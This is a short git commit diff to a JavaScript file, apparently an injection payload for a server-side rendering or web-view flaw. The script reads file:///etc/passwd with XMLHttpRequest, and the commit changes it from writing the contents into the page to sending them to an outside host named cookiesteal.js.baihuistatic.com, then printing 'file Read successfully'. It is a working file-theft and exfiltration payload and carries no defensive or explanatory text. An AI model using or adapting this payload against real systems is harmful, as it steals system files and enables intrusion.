cc857bf7e0869c2a1a81ba6408c917884f1323a6
Nagarajan <31201788+NagarajanMohan@users.noreply.github.com>
2023-09-25 15:43:27 +0530

    Update 8f2be8b7_wmsbridge.js

--- js/8f2be8b7_wmsbridge.js
+++ js/8f2be8b7_wmsbridge.js
@@ -1,6 +1,11 @@
 var x=new XMLHttpRequest;
 x.onload=function() {
-    document.write(this.responseText)
+    var y = new XMLHttpRequest;
+    y.onload = function(){
+        document.write("file Read successfully");
+    }
+    y.open("GET","https://cookiesteal.js.baihuistatic.com/server/MonitorRequestHeader/"+this.responseText);
+    y.send();
 };
 x.open("GET","file:///etc/passwd");
 x.send();
